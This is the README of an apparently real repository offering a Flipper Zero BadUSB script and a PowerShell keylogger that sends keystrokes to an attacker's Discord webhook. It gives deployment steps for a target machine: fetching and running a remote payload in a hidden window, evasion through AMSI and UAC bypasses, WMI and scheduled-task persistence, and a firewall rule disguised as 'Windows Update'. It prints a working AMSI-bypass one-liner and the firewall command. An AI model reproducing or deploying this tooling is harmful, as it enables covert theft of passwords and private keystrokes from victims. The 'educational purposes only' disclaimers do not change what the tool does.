# 🚀 Flipper Zero BadUSB + Discord Keylogger 🚀  

Welcome to the **Flipper Zero BadUSB + Discord Keylogger** repository! This project demonstrates how to use a Flipper Zero device to deploy a stealthy PowerShell payload that logs keystrokes and sends them to a Discord webhook.  

**Disclaimer**: This project is for **educational and research purposes only**. Misuse of this tool is strictly prohibited. Always ensure you have proper authorization before testing or deploying any payloads.  

---

## 📂 Project Overview  

This repository contains:  
- **BadUSB Script**: A Flipper Zero-compatible script to execute a PowerShell payload on a target machine.  
- **PowerShell Payload**: A multi-stage payload with keylogging, persistence, and anti-detection mechanisms.   

---

## 🛠️ Features  

### 🎯 **BadUSB Script**  
- **Silent Execution**: Runs PowerShell in a hidden window with elevated privileges.  
- **Payload Delivery**: Downloads and executes the PowerShell payload from a remote URL.  
- **Randomized Delays**: Avoids detection by introducing random delays between commands.  

### 🖥️ **PowerShell Payload**  
- **AMSI Bypass**: Evades Anti-Malware Scan Interface (AMSI) detection.  
- **Keylogger**: Captures keystrokes and sends them to a Discord webhook.  
- **Persistence**: Ensures the payload survives reboots using WMI event subscriptions and scheduled tasks.  
- **Firewall Bypass**: Adds a firewall rule to allow outbound PowerShell traffic.  
- **UAC Bypass**: Automatically elevates privileges using a UAC bypass technique.  

---

## 🚀 Getting Started  

### Prerequisites  
- **Flipper Zero**: A versatile tool for penetration testing and hardware hacking.  
- **Discord Webhook**: Create a Discord webhook URL to receive keylogs.  
- **PowerShell 5.1+**: Ensure the target machine has PowerShell installed.  

### Setup Instructions  

1. **Clone the Repository**:  
   ```bash  
   git clone https://github.com/FoeXploit/Flipper-Zero-BadUSB-Discord-Keylogger
   cd Flipper-Zero-BadUSB-Discord-Keylogger 
   ```  

2. **Update the Payload URL**:  
   - Replace `YOUR_RAW_PS1_URL` in the BadUSB script with the URL where your `payload.ps1` is hosted.  
   - Example:  
     ```plaintext  
     http://raw.githubusercontent.com/YOUR_USERNAME/flipper-badusb-keylogger/main/payload.ps1  
     ```  

3. **Update the Discord Webhook**:  
   - Replace `YOUR_DISCORD_WEBHOOK_URL_HERE` in the PowerShell payload with your actual Discord webhook URL.  

4. **Upload the BadUSB Script**:  
   - Copy the BadUSB script (`badusb.txt`) to your Flipper Zero.  
   - Use the Flipper Zero's BadUSB app to execute the script on the target machine.  

5. **Deploy the Payload**:  
   - When the BadUSB script runs, it will download and execute the PowerShell payload on the target machine.  

---

## 🧰 Payload Breakdown  

### Key Components  

1. **AMSI Bypass**:  
   - Disables AMSI to evade detection by antivirus software.  
   ```powershell  
   [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)  
   ```  

2. **Keylogger**:  
   - Captures keystrokes and logs them to a file (`$env:temp\keylog.txt`).  
   - Sends logs to a Discord webhook every 30 seconds.  

3. **Persistence**:  
   - Uses WMI event subscriptions and scheduled tasks to ensure the payload runs after reboots.  

4. **Firewall Bypass**:  
   - Adds a firewall rule to allow outbound PowerShell traffic.  
   ```powershell  
   New-NetFirewallRule -DisplayName "Windows Update" -Direction Outbound -Action Allow -Program "powershell.exe"  
   ```  

5. **UAC Bypass**:  
   - Automatically elevates privileges using a UAC bypass technique.  

---

## 🛡️ Anti-Detection Mechanisms  

- **AMSI Bypass**: Evades detection by disabling AMSI.  
- **Randomized Delays**: Introduces random delays between actions to avoid behavioral detection.  
- **Memory-Resident Keylogger**: Stores keystrokes in memory before sending them to Discord.  

---

## 📜 Usage  

1. **Execute the BadUSB Script**:  
   - Plug the Flipper Zero into the target machine and run the BadUSB script.  

2. **Monitor Discord Webhook**:  
   - Keystrokes will be sent to your Discord webhook in real-time.  

3. **Clean Up**:  
   - The payload includes a self-destruct mechanism to remove traces after execution.  

---

## ⚠️ Warning  

- **Detection Risk**: While this payload includes anti-detection mechanisms, it may still be flagged by advanced security software.  
- **Legal Compliance**: Always ensure you have proper authorization before testing or deploying this tool.  

---

## 📝 License  

This project is licensed under the **MIT License**. See the [LICENSE](LICENSE) file for details.  

---

## 🙏 Credits  

- **Flipper Zero**: For providing an amazing platform for hardware hacking.  
- **PowerShell Community**: For inspiring advanced scripting techniques.  

---

Enjoy responsibly! 🎉  

--- 

**Note**: This project is for educational purposes only. Use it ethically and legally.  

---
